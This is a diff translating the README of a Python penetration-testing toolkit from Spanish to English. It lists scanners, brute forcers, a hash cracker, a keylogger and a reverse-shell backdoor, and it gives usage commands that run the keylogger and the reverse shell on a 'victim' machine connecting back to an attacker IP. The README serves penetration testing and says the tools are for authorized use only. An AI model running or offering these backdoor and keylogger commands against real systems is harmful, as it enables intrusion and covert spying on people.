@@ -1,32 +1,32 @@
 # PenTools 🛡️
 
-**PenTools** es una colección de scripts en Python diseñados para profesionales de la ciberseguridad, pentesters y entusiastas. Estas herramientas cubren varias fases de una prueba de penetración, desde el reconocimiento hasta la explotación.
+**PenTools** is a collection of Python scripts designed for cybersecurity professionals, penetration testers, and enthusiasts. These tools cover various phases of a penetration test, from reconnaissance to exploitation.
 
-> ⚠️ **AVISO LEGAL**: Este repositorio es para **FINES EDUCATIVOS** y **PRUEBAS AUTORIZADAS ÚNICAMENTE**. El autor no es responsable de ningún mal uso de estas herramientas. No utilices estas herramientas en ningún sistema sin permiso explícito.
+> ⚠️ **DISCLAIMER**: This repository is for **EDUCATIONAL PURPOSES** and **AUTHORIZED TESTING ONLY**. The author is not responsible for any misuse of these tools. Do not use these tools on any system without explicit permission.
 
-## 📦 Herramientas Incluidas
+## 📦 Tools Included
 
-| Herramienta | Descripción |
+| Tool | Description |
 |------|-------------|
-| **Network Scanner** | Escanea la red local buscando dispositivos activos usando peticiones ARP. |
-| **Port Scanner** | Escanea puertos específicos o rangos en una IP objetivo para encontrar servicios abiertos. |
-| **Subdomain Enumeration** | Herramienta multi-hilo para descubrir subdominios usando una wordlist. |
-| **Directory Enumeration** | Fuerza bruta de directorios en un servidor web para encontrar rutas ocultas. |
-| **SSH Brute Force** | Cracker de contraseñas SSH multi-hilo. |
-| **Hash Cracker** | Herramienta simple para romper hashes usando un ataque de diccionario. |
-| **KeyLogger** | Captura pulsaciones de teclas y las guarda en un archivo (requiere privilegios de Admin). |
-| **JS Crawler** | Descarga todos los archivos JavaScript de una URL objetivo. |
-| **Reverse Shell** | Herramienta de acceso remoto (Backdoor) con arquitectura cliente-servidor. |
+| **Network Scanner** | Scans local network for active devices using ARP requests. |
+| **Port Scanner** | Scans specific or range of ports on a target IP to find open services. |
+| **Subdomain Enumeration** | Multi-threaded tool to discover subdomains using a wordlist. |
+| **Directory Enumeration** | Brute-forces directories on a web server to find hidden paths. |
+| **SSH Brute Force** | Multi-threaded SSH password cracker. |
+| **Hash Cracker** | Simple tool to crack hashes using a dictionary attack. |
+| **KeyLogger** | Captures keystrokes and saves them to a file (requires Admin privileges). |
+| **JS Crawler** | Downloads all JavaScript files from a target URL. |
+| **Reverse Shell** | Remote access tool (Backdoor) with client-server architecture. |
 
-## 🚀 Instalación
+## 🚀 Installation
 
-1. Clona el repositorio:
+1. Clone the repository:
    ```bash
-   git clone https://github.com/tuusuario/PenTools.git
+   git clone https://github.com/yourusername/PenTools.git
    cd PenTools
    ```
 
-2. Crea un entorno virtual (Recomendado):
+2. Create a virtual environment (Recommended):
    ```bash
    # Windows
    python -m venv .venv
@@ -37,13 +37,13 @@
    source .venv/bin/activate
    ```
 
-3. Instala las dependencias:
+3. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```
-   *(Nota: Puedes necesitar crear un archivo requirements.txt con: `requests`, `scapy`, `paramiko`, `keyboard`, `pyfiglet`)*
+   *(Note: You may need to create a requirements.txt file with: `requests`, `scapy`, `paramiko`, `keyboard`, `pyfiglet`)*
 
-## 🛠️ Uso
+## 🛠️ Usage
 
 ### Subdomain Enumeration
 ```bash
@@ -52,7 +52,7 @@ python web/subdomain_enumeration.py <IP> -w resources/wordlists/subdomains.txt
 
 ### SSH Brute Force
 ```bash
-python network/ssh_bruteforce.py <IP> <USUARIO> <DICCIONARIO> -t 10
+python network/ssh_bruteforce.py <IP> <USER> <WORDLIST> -t 10
 ```
 
 ### Directory Enumeration
@@ -61,20 +61,20 @@ python web/directory_enumeration.py <IP> -w resources/wordlists/directories.txt
 ```
 
 ### KeyLogger
-**Servidor (Atacante):**
+**Server (Attacker):**
 ```bash
 python spyware/keylogger_server.py -p 8080
 ```
 
-**Cliente (Víctima):**
+**Client (Victim):**
 ```bash
-python spyware/keylogger.py --ip <IP_ATACANTE> --port 8080
+python spyware/keylogger.py --ip <ATTACKER_IP> --port 8080
 ```
-*(Requiere privilegios de Administrador/Root para capturar teclas)*
+*(Requires Administrator/Root privileges to capture keys)*
 
 ### JS Crawler
 ```bash
-python web/js_crawler.py http://ejemplo.com -o scripts_encontrados
+python web/js_crawler.py http://example.com -o found_scripts
 ```
 
 ### Hash Cracker
@@ -84,22 +84,22 @@ python crypto/hash_cracker.py <HASH> -w resources/wordlists/passwords.txt -m md5
 
 ### File Downloader
 ```bash
-python web/file_downloader.py <URL> -o nombre_archivo.ext
+python web/file_downloader.py <URL> -o filename.ext
 ```
 
 ### Reverse Shell (Backdoor)
-**Servidor (Atacante):**
+**Server (Attacker):**
 ```bash
 python backdoors/listener.py -p 4444
 ```
 
-**Cliente (Víctima):**
+**Client (Victim):**
 ```bash
-python backdoors/reverse_shell.py --ip <IP_ATACANTE> --port 4444
+python backdoors/reverse_shell.py --ip <ATTACKER_IP> --port 4444
 ```
 
-## 🤝 Contribuir
-Las pull requests son bienvenidas. Para cambios mayores, por favor abre primero un issue para discutir qué te gustaría cambiar.
+## 🤝 Contributing
+Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
 
-## 📝 Licencia
-Este proyecto está bajo la Licencia MIT - mira el archivo [LICENSE](LICENSE) para más detalles.
+## 📝 License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
